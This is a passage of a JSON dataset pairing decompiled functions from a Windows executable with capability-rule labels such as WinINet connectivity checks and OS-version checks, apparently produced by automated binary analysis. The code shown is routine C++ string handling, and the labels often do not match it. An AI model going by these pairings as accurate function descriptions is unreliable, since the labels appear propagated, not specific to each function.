            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a27c0(ulong *arg1)\n\n{\n    *arg1 = 0x140119000;\n    fcn.1400a5760(arg1 + 2);\n    if ((*(arg1 + 3) != '\\0') && (arg1[6] != 0)) {\n        fcn.1400bc6b0();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "14008323": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140083230(int64_t *arg1, int64_t *arg2, ulong arg3)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    int64_t **ppiStack168;\n    int64_t iStack160;\n    int64_t *apiStack152 [2];\n    int64_t **ppiStack136;\n    int64_t iStack128;\n    int64_t *apiStack120 [2];\n    uchar *puStack104;\n    ulong uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg2[1];\n    iVar3 = *arg2;\n    pcVar4 = *(*piVar2 + 0x20);\n    if (pcVar4 == 0x140022ca0) {\n        puStack104 = auStack88;\n        auStack88[0] = 0;\n        uStack96 = 0;\n        if (iVar3 == 1) {\n            fcn.1400a6b40(&puStack104, 0, 0, \"iostream error\");\n        }\n        else {\n            fcn.1400a6b40(&puStack104, 0, 0, 0x14010e5a8);\n        }\n    }\n    else {\n        (*pcVar4)(&puStack104);\n    }\n    piVar6 = fcn.1400a6b40(&puStack104, 0, 0, 0x14010e5cb);\n    if (*piVar6 == piVar6 + 2) {\n        iStack128 = -1;\n        ppiStack136 = apiStack120;\n        if (piVar6[1] != -1) {\n            sub.msvcrt.dll_memcpy(apiStack120);\n            iStack128 = piVar6[1];\n        }\n    }\n    else {\n        apiStack120[0] = piVar6[2];\n        iStack128 = piVar6[1];\n        ppiStack136 = *piVar6;\n    }\n    *piVar6 = piVar6 + 2;\n    piVar6[1] = 0;\n    *(piVar6 + 2) = 0;\n    sub.msvcrt.dll_strlen(arg3);\n    piVar6 = fcn.1400a6b40(&ppiStack136, 0, 0, arg3);\n    ppiVar1 = piVar6 + 2;\n    if (*piVar6 == ppiVar1) {\n        iStack160 = -1;\n        ppiStack168 = apiStack152;\n        if (piVar6[1] != -1) {\n            sub.msvcrt.dll_memcpy(apiStack152, ppiVar1);\n            iStack160 = piVar6[1];\n        }\n    }\n    else {\n        apiStack152[0] = piVar6[2];\n        iStack160 = piVar6[1];\n        ppiStack168 = *piVar6;\n    }\n    *piVar6 = ppiVar1;\n    piVar6[1] = 0;\n    *(piVar6 + 2) = 0;\n    fcn.140095e10(arg1, &ppiStack168);\n    if (ppiStack168 != apiStack152) {\n        fcn.1400bc6c0();\n    }\n    if (ppiStack136 != apiStack120) {\n        fcn.1400bc6c0();\n    }\n    if (puStack104 != auStack88) {\n        fcn.1400bc6c0();\n    }\n    iVar5 = *0x1401104b0;\n    arg1[2] = iVar3;\n    arg1[3] = piVar2;\n    *arg1 = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 857
    },
    "1400834d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400834d0(int64_t *arg1, int64_t *arg2, uint8_t **arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uint8_t *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    int64_t **ppiVar7;\n    int64_t **ppiVar8;\n    uchar **ppuStack176;\n    int64_t **ppiStack168;\n    int64_t iStack160;\n    int64_t *apiStack152 [2];\n    int64_t **ppiStack136;\n    int64_t **ppiStack128;\n    int64_t **appiStack120 [2];\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar1 = arg2[1];\n    iVar2 = *arg2;\n    if (*(*piVar1 + 0x20) == 0x140022ca0) {\n        puStack104 = &uStack88;\n        uStack96 = 0;\n        uStack88 = 0;\n        if (iVar2 == 1) {\n            fcn.1400a6b40(&puStack104, 0, 0, \"iostream error\");\n        }\n        else {\n            fcn.1400a6b40(&puStack104, 0, 0, 0x14010e5a8);\n        }\n    }\n    else {\n        (**(*piVar1 + 0x20))(&puStack104, piVar1);\n    }\n    ppuStack176 = &puStack104;\n    puVar3 = *arg3;\n    ppiVar7 = arg3[1];\n    ppiStack168 = ppiVar7;\n    ppiStack136 = appiStack120;\n    if (0xf < ppiVar7) {\n        ppiVar6 = fcn.1400a9310(&ppiStack136, &ppiStack168, 0);\n        appiStack120[0] = ppiStack168;\n        ppiStack136 = ppiVar6;\n        goto code_r0x00014008372a;\n    }\n    if (ppiVar7 == 0x1) {\n        appiStack120[0] = appiStack120[0] & 0xffffffffffffff00 | *puVar3;\n    }\n    else {\n        ppiVar6 = appiStack120;\n        if (ppiVar7 != NULL) goto code_r0x00014008372a;\n    }\n    do {\n        ppiVar7 = ppiStack168;\n        *(ppiStack136 + ppiStack168) = 0;\n        ppiStack128 = ppiStack168;\n        if (0x3fffffffffffffffU - ppiStack168 < 2) {\n            fcn.1400bd360(\"basic_string::append\");\n        }\n        else {\n            fcn.1400a91c0(&ppiStack136, 0x14010e5cb, 2);\n            ppiVar6 = ppiStack128 + uStack96;\n            if (ppiStack136 == appiStack120) {\n                if ((0xf < ppiVar6) && (puStack104 != &uStack88)) {\ncode_r0x00014008360a:\n                    ppiVar8 = CONCAT71(Stack87, uStack88);\n                    goto code_r0x000140083612;\n                }\n            }\n            else if (appiStack120[0] < ppiVar6) {\n                if (puStack104 != &uStack88) goto code_r0x00014008360a;\n                ppiVar8 = 0xf;\ncode_r0x000140083612:\n                if (ppiVar6 <= ppiVar8) {\n                    piVar5 = fcn.1400a6b40(ppuStack176, 0, 0, ppiStack136);\n                    goto code_r0x00014008363c;\n                }\n            }\n            if (uStack96 <= 0x3fffffffffffffffU - ppiStack128) {\n                piVar5 = fcn.1400a91c0(&ppiStack136, puStack104, uStack96);\ncode_r0x00014008363c:\n                ppiVar7 = piVar5 + 2;\n                if (*piVar5 == ppiVar7) {\n                    iStack160 = -1;\n                    ppiStack168 = apiStack152;\n                    if (piVar5[1] != -1) {\n                        sub.msvcrt.dll_memcpy(apiStack152, ppiVar7);\n                        iStack160 = piVar5[1];\n                    }\n                }\n                else {\n                    apiStack152[0] = piVar5[2];\n                    iStack160 = piVar5[1];\n                    ppiStack168 = *piVar5;\n                }\n                *piVar5 = ppiVar7;\n                piVar5[1] = 0;\n                *(piVar5 + 2) = 0;\n                fcn.140095e10(arg1, &ppiStack168);\n                if (ppiStack168 != apiStack152) {\n                    fcn.1400bc6c0();\n                }\n                if (ppiStack136 != appiStack120) {\n                    fcn.1400bc6c0();\n                }\n                if (puStack104 != &uStack88) {\n                    fcn.1400bc6c0();\n                }\n                iVar4 = *0x1401104b0;\n                arg1[2] = iVar2;\n                arg1[3] = piVar1;\n                *arg1 = iVar4 + 0x10;\n                return;\n            }\n        }\n        fcn.1400bd360(\"basic_string::append\");\n        ppiVar6 = appiStack120;\ncode_r0x00014008372a:\n        sub.msvcrt.dll_memcpy(ppiVar6, puVar3, ppiVar7);\n    } while( true );\n}\n",
        "token_count": 1332
    },
    "1400845f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400845f0(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar *puVar8;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack656 [16];\n    uchar *apuStack640 [2];\n    uchar auStack624 [16];\n    uchar auStack608 [16];\n    ulong uStack584;\n    int64_t *piStack576;\n    uint64_t uStack568;\n    uint64_t uStack560;\n    uchar *puStack552;\n    uchar uStack496;\n    ulong uStack488;\n    ushort uStack480;\n    ushort uStack464;\n    unkbyte6 Stack462;\n    uchar auStack456 [16];\n    uchar uStack433;\n    int64_t iStack432;\n    uchar auStack424 [16];\n    ulong uStack408;\n    int64_t *piStack400;\n    uint64_t uStack392;\n    uint64_t uStack384;\n    uchar *puStack376;\n    uint32_t uStack328;\n    uchar **ppuStack320;\n    uint32_t uStack312;\n    ulong uStack304;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    uchar auStack288 [16];\n    uchar *apuStack272 [2];\n    uchar auStack256 [16];\n    uchar auStack240 [16];\n    ulong uStack216;\n    int64_t *piStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uint32_t uStack128;\n    uint32_t uStack112;\n    unkbyte10 *pStack104;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    uchar auStack88 [16];\n    uchar uStack65;\n    int64_t iStack64;\n    \n    auStack240 = *in_R9;\n    uStack192 = in_stack_00000028;\n    uStack200 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        auStack88 = auStack240;\n        (**(*arg3 + 0x10))(arg1, arg3, auStack88, uStack192 & 0xff);\n    }\n    else {\n        if (in_stack_00000048[4] == 0) {\n            piStack400 = arg3;\n            uStack216 = fcn.1400bd270(0x14010a8aa);\n            fcn.14007bf20(iStack64 + -0x18);\n            uVar5 = uStack216;\n            fcn.140014f30(uStack216);\n            auStack424 = *in_R9;\n            uStack384 = uStack128;\n            uStack392 = uStack112;\n            piVar6 = CONCAT62(Stack94, uStack96);\n            piStack208 = arg3;\n            if (piVar6 == NULL) {\n                ppuStack320 = &uStack304;\n                uStack328 = uStack112;\n                uStack304 = *pStack104;\n                uStack296 = *pStack104 >> 0x40;\n                puStack376 = 0x14008488a;\n                auStack288 = auStack424;\n                (**(*piStack400 + 0x10))();\n                return uVar5;\n            }\n            piStack576 = piStack400;\n            if (piVar6[4] != 0) {\n                iVar3 = *piVar6;\n                unaff_R12 = auStack256;\n                apuStack272[0] = unaff_R12;\n                if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                    ppuStack320 = apuStack272;\n                    uStack328 = uStack112;\n                    puStack376 = 0x1400847ec;\n                    fcn.1400a7220(ppuStack320, iVar3, iVar3 + piVar6[1]);\n                    puStack376 = 0x14008481c;\n                    auStack288 = auStack424;\n                    (**(*piStack400 + 0x18))(uVar5, piStack400, auStack288, uStack384 & 0xff);\n                    if (apuStack272[0] == unaff_R12) {\n                        return uVar5;\n                    }\n                    puStack376 = 0x14008482b;\n                    fcn.1400bc6c0();\n                    return uVar5;\n                }\n                puStack376 = 0x140084891;\n                fcn.1400a9dd0();\n            }\n            puStack376 = 0x14008489d;\n            uStack408 = fcn.1400bd270(\"uninitialized __any_string\");\n            if (apuStack272[0] != unaff_R12) {\n                puStack376 = 0x1400848af;\n                fcn.1400bc6c0();\n            }\n            puStack376 = 0x1400848b7;\n            uVar5 = uStack408;\n            fcn.140014f30(uStack408);\n            auStack608 = *in_R9;\n            uStack560 = uStack328;\n            uStack568 = uStack312;\n            piVar6 = CONCAT62(Stack294, uStack296);\n            puStack376 = unaff_R12;\n            if (piVar6 == NULL) {\n                auStack456 = auStack608;\n                (**(*piStack576 + 0x10))();\n            }\n            else {\n                if (piVar6[4] == 0) {\n                    piVar7 = piStack576;\n                    uStack584 = fcn.1400bd270(0x14010a8aa);\n                    fcn.140072a20(iStack432 + -0x18);\n                    uVar5 = uStack584;\n                    fcn.140014f30(uStack584);\n                    auStack656 = *in_R9;\n                    piVar6 = CONCAT62(Stack462, uStack464);\n                    puStack552 = unaff_R12;\n                    if (piVar6 == NULL) {\n                        (**(*piVar7 + 0x10))();\n                        return uVar5;\n                    }\n                    puVar8 = unaff_R12;\n                    if (piVar6[4] != 0) {\n                        iVar3 = *piVar6;\n                        puVar8 = auStack624;\n                        apuStack640[0] = puVar8;\n                        if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                            fcn.1400aada0(apuStack640, iVar3, iVar3 + piVar6[1] * 2);\n                            (**(*piVar7 + 0x18))\n                                      (uVar5, piVar7, auStack656, uStack496, uStack488, uStack480, apuStack640);\n                            if (apuStack640[0] == puVar8) {\n                                return uVar5;\n                            }\n                            fcn.1400bc6c0();\n                            return uVar5;\n                        }\n                        fcn.1400a9dd0();\n                    }\n                    piVar6 = fcn.1400bd270(\"uninitialized __any_string\");\n                    if (apuStack640[0] != puVar8) {\n                        fcn.1400bc6c0();\n                    }\n                    fcn.140014f30(piVar6);\n                    *piVar6 = 0x140116370;\n                    piVar7 = piVar6[3];\n                    if (**0x14010fc90 == 0) {\n                        iVar4 = *(piVar7 + 1);\n                        *(piVar7 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar2 = piVar7 + 1;\n                        iVar4 = *piVar2;\n                        *piVar2 = *piVar2 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        (**(*piVar7 + 8))();\n                    }\n                    *piVar6 = *0x1401106c0 + 0x10;\n                    fcn.1400a5760(piVar6 + 2);\n                    fcn.1400a5790(piVar6);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n                    uVar5 = (*_sym.imp.msvcrt.dll_free)(piVar6);\n                    return uVar5;\n                }\n                iStack432 = fcn.140072540(*piVar6, *piVar6 + piVar6[1] * 2);\n                auStack456 = auStack608;\n                (**(*piStack576 + 0x18))(uVar5, piStack576, auStack456, uStack560 & 0xff);\n                if (**0x14010fc90 == 0) {\n                    iVar4 = *(iStack432 + -8);\n                    *(iStack432 + -8) = iVar4 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack432 + -8;\n                    iVar4 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar4 < 1) {\n                    fcn.140072a10(iStack432 + -0x18, &uStack433);\n                }\n            }\n            return uVar5;\n        }\n        iStack64 = fcn.14007b9e0(*in_stack_00000048, in_stack_00000048[1] + *in_stack_00000048);\n        auStack88 = auStack240;\n        (**(*arg3 + 0x18))(arg1, arg3, auStack88, uStack192 & 0xff);\n        if (**0x14010fc90 == 0) {\n            iVar4 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14007bf10(iStack64 + -0x18, &uStack65);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 2346
    },
    "14008476": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140084760(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar *puVar8;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    unkbyte10 *in_stack_00000040;\n    int64_t *in_stack_00000048;\n    uchar auStack488 [16];\n    uchar *puStack472;\n    uchar auStack456 [16];\n    uchar auStack440 [16];\n    ulong uStack416;\n    int64_t *piStack408;\n    uint64_t uStack400;\n    uint64_t uStack392;\n    uchar *puStack384;\n    uchar uStack328;\n    ulong uStack320;\n    ushort uStack312;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    uchar auStack288 [16];\n    uchar uStack265;\n    int64_t iStack264;\n    uchar auStack256 [16];\n    ulong uStack240;\n    int64_t *piStack232;\n    uint64_t uStack224;\n    uint64_t uStack216;\n    uchar *puStack208;\n    uint32_t uStack160;\n    uchar *puStack152;\n    uint32_t uStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uchar auStack120 [16];\n    uchar *puStack104;\n    uchar auStack88 [40];\n    \n    auStack256 = *in_R9;\n    uStack216 = in_stack_00000028;\n    uStack224 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        puStack152 = &stack0xffffffffffffff78;\n        uStack160 = in_stack_00000038;\n        uStack136 = *in_stack_00000040;\n        uStack128 = *in_stack_00000040 >> 0x40;\n        puStack208 = 0x14008488a;\n        auStack120 = auStack256;\n        (**(*arg3 + 0x10))(arg1, arg3, &stack0xffffffffffffff88, uStack216 & 0xff);\n        return arg1;\n    }\n    piStack408 = arg3;\n    if (in_stack_00000048[4] != 0) {\n        iVar3 = *in_stack_00000048;\n        unaff_R12 = &stack0xffffffffffffffa8;\n        puStack104 = unaff_R12;\n        if ((iVar3 != 0) || (in_stack_00000048[1] == 0)) {\n            puStack152 = &stack0xffffffffffffff98;\n            uStack160 = in_stack_00000038;\n            puStack208 = 0x1400847ec;\n            fcn.1400a7220(puStack152, iVar3, iVar3 + in_stack_00000048[1]);\n            puStack208 = 0x14008481c;\n            auStack120 = auStack256;\n            (**(*arg3 + 0x18))(arg1, arg3, &stack0xffffffffffffff88, uStack216 & 0xff);\n            if (puStack104 == unaff_R12) {\n                return arg1;\n            }\n            puStack208 = 0x14008482b;\n            fcn.1400bc6c0();\n            return arg1;\n        }\n        puStack208 = 0x140084891;\n        fcn.1400a9dd0();\n    }\n    puStack208 = 0x14008489d;\n    uStack240 = fcn.1400bd270(\"uninitialized __any_string\");\n    if (puStack104 != unaff_R12) {\n        puStack208 = 0x1400848af;\n        fcn.1400bc6c0();\n    }\n    puStack208 = 0x1400848b7;\n    uVar5 = uStack240;\n    fcn.140014f30(uStack240);\n    auStack440 = *in_R9;\n    uStack392 = uStack160;\n    uStack400 = uStack144;\n    piVar6 = CONCAT62(Stack126, uStack128);\n    piStack232 = arg3;\n    puStack208 = unaff_R12;\n    if (piVar6 == NULL) {\n        auStack288 = auStack440;\n        (**(*piStack408 + 0x10))();\n    }\n    else {\n        if (piVar6[4] == 0) {\n            piVar7 = piStack408;\n            uStack416 = fcn.1400bd270(0x14010a8aa);\n            fcn.140072a20(iStack264 + -0x18);\n            uVar5 = uStack416;\n            fcn.140014f30(uStack416);\n            auStack488 = *in_R9;\n            piVar6 = CONCAT62(Stack294, uStack296);\n            puStack384 = unaff_R12;\n            if (piVar6 == NULL) {\n                (**(*piVar7 + 0x10))();\n                return uVar5;\n            }\n            puVar8 = unaff_R12;\n            if (piVar6[4] != 0) {\n                iVar3 = *piVar6;\n                puVar8 = &stack0xfffffffffffffe38;\n                puStack472 = puVar8;\n                if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                    fcn.1400aada0(&stack0xfffffffffffffe28, iVar3, iVar3 + piVar6[1] * 2);\n                    (**(*piVar7 + 0x18))\n                              (uVar5, piVar7, &stack0xfffffffffffffe18, uStack328, uStack320, uStack312, \n                               &stack0xfffffffffffffe28);\n                    if (puStack472 == puVar8) {\n                        return uVar5;\n                    }\n                    fcn.1400bc6c0();\n                    return uVar5;\n                }\n                fcn.1400a9dd0();\n            }\n            piVar6 = fcn.1400bd270(\"uninitialized __any_string\");\n            if (puStack472 != puVar8) {\n                fcn.1400bc6c0();\n            }\n            fcn.140014f30(piVar6);\n            *piVar6 = 0x140116370;\n            piVar7 = piVar6[3];\n            if (**0x14010fc90 == 0) {\n                iVar4 = *(piVar7 + 1);\n                *(piVar7 + 1) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = piVar7 + 1;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 == 1) {\n                (**(*piVar7 + 8))();\n            }\n            *piVar6 = *0x1401106c0 + 0x10;\n            fcn.1400a5760(piVar6 + 2);\n            fcn.1400a5790(piVar6);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar5 = (*_sym.imp.msvcrt.dll_free)(piVar6);\n            return uVar5;\n        }\n        iStack264 = fcn.140072540(*piVar6, *piVar6 + piVar6[1] * 2);\n        auStack288 = auStack440;\n        (**(*piStack408 + 0x18))(uVar5, piStack408, &stack0xfffffffffffffee0, uStack392 & 0xff);\n        if (**0x14010fc90 == 0) {\n            iVar4 = *(iStack264 + -8);\n            *(iStack264 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack264 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140072a10(iStack264 + -0x18, &stack0xfffffffffffffef7);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 1907
    },
    "1400848c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400848c0(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t arg2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack288 [16];\n    uchar *apuStack272 [2];\n    uchar auStack256 [16];\n    uchar auStack240 [16];\n    ulong uStack216;\n    int64_t *piStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uchar uStack128;\n    ulong uStack120;\n    ushort uStack112;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    uchar auStack88 [16];\n    uchar uStack65;\n    int64_t iStack64;\n    \n    auStack240 = *in_R9;\n    uStack192 = in_stack_00000028;\n    uStack200 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        auStack88 = auStack240;\n        (**(*arg3 + 0x10))(arg1, arg3, auStack88, uStack192 & 0xff);\n    }\n    else {\n        if (in_stack_00000048[4] == 0) {\n            piVar6 = arg3;\n            uStack216 = fcn.1400bd270(0x14010a8aa);\n            fcn.140072a20(iStack64 + -0x18);\n            uVar4 = uStack216;\n            fcn.140014f30(uStack216);\n            auStack288 = *in_R9;\n            piVar5 = CONCAT62(Stack94, uStack96);\n            piStack208 = arg3;\n            if (piVar5 == NULL) {\n                (**(*piVar6 + 0x10))();\n                return uVar4;\n            }\n            if (piVar5[4] != 0) {\n                arg2 = *piVar5;\n                unaff_R12 = auStack256;\n                apuStack272[0] = unaff_R12;\n                if ((arg2 != 0) || (piVar5[1] == 0)) {\n                    fcn.1400aada0(apuStack272, arg2, arg2 + piVar5[1] * 2);\n                    (**(*piVar6 + 0x18))(uVar4, piVar6, auStack288, uStack128, uStack120, uStack112, apuStack272);\n                    if (apuStack272[0] == unaff_R12) {\n                        return uVar4;\n                    }\n                    fcn.1400bc6c0();\n                    return uVar4;\n                }\n                fcn.1400a9dd0();\n            }\n            piVar5 = fcn.1400bd270(\"uninitialized __any_string\");\n            if (apuStack272[0] != unaff_R12) {\n                fcn.1400bc6c0();\n            }\n            fcn.140014f30(piVar5);\n            *piVar5 = 0x140116370;\n            piVar6 = piVar5[3];\n            if (**0x14010fc90 == 0) {\n                iVar3 = *(piVar6 + 1);\n                *(piVar6 + 1) = iVar3 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = piVar6 + 1;\n                iVar3 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar3 == 1) {\n                (**(*piVar6 + 8))();\n            }\n            *piVar5 = *0x1401106c0 + 0x10;\n            fcn.1400a5760(piVar5 + 2);\n            fcn.1400a5790(piVar5);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar4 = (*_sym.imp.msvcrt.dll_free)(piVar5);\n            return uVar4;\n        }\n        iStack64 = fcn.140072540(*in_stack_00000048, *in_stack_00000048 + in_stack_00000048[1] * 2);\n        auStack88 = auStack240;\n        (**(*arg3 + 0x18))(arg1, arg3, auStack88, uStack192 & 0xff);\n        if (**0x14010fc90 == 0) {\n            iVar3 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar3 < 1) {\n            fcn.140072a10(iStack64 + -0x18, &uStack65);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1203
    },
    "140084a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140084a30(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t arg2;\n    int64_t *piVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t *arg1_00;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar in_stack_00000028;\n    ulong in_stack_00000030;\n    ushort in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack120 [16];\n    uchar *apuStack104 [2];\n    uchar auStack88 [40];\n    \n    auStack120 = *in_R9;\n    if (in_stack_00000048 == NULL) {\n        (**(*arg3 + 0x10))(arg1, arg3, auStack120, in_stack_00000028);\n        return arg1;\n    }\n    if (in_stack_00000048[4] != 0) {\n        arg2 = *in_stack_00000048;\n        unaff_R12 = auStack88;\n        apuStack104[0] = unaff_R12;\n        if ((arg2 != 0) || (in_stack_00000048[1] == 0)) {\n            fcn.1400aada0(apuStack104, arg2, arg2 + in_stack_00000048[1] * 2);\n            (**(*arg3 + 0x18))(arg1, arg3, auStack120, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                               apuStack104);\n            if (apuStack104[0] == unaff_R12) {\n                return arg1;\n            }\n            fcn.1400bc6c0();\n            return arg1;\n        }\n        fcn.1400a9dd0();\n    }\n    arg1_00 = fcn.1400bd270(\"uninitialized __any_string\");\n    if (apuStack104[0] != unaff_R12) {\n        fcn.1400bc6c0();\n    }\n    fcn.140014f30(arg1_00);\n    *arg1_00 = 0x140116370;\n    piVar2 = arg1_00[3];\n    if (**0x14010fc90 == 0) {\n        iVar3 = *(piVar2 + 1);\n        *(piVar2 + 1) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 == 1) {\n        (**(*piVar2 + 8))();\n    }\n    *arg1_00 = *0x1401106c0 + 0x10;\n    fcn.1400a5760(arg1_00 + 2);\n    fcn.1400a5790(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*_sym.imp.msvcrt.dll_free)(arg1_00);\n    return uVar4;\n}\n",
        "token_count": 746
    },
    "14008946": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140089460(int64_t *arg1)\n\n{\n    uchar *arg2;\n    int64_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    ulong in_RDX;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint64_t in_R8;\n    int64_t iVar14;\n    ulong uStack440;\n    uchar auStack432 [32];\n    int64_t aiStack400 [3];\n    int64_t *piStack376;\n    uchar auStack368 [4];\n    uint32_t uStack364;\n    int64_t iStack360;\n    int64_t iStack352;\n    ulong auStack344 [2];\n    int64_t *piStack328;\n    uint64_t uStack320;\n    int64_t iStack208;\n    uchar auStack200 [128];\n    uchar auStack72 [8];\n    \n    uStack320 = 1;\n    if (arg1[4] < arg1[5]) {\n        in_RDX = 0xffffffff;\n        iVar4 = (**(*arg1 + 0x68))();\n        uStack320 = iVar4 != -1;\n    }\n    if (*(arg1 + 0x82) == '\\0') {\n        return uStack320;\n    }\n    piVar9 = arg1[0x14];\n    if (piVar9 != NULL) {\n        uVar5 = (**(*piVar9 + 0x30))();\n        if (uVar5 != '\\0') {\n            return uStack320;\n        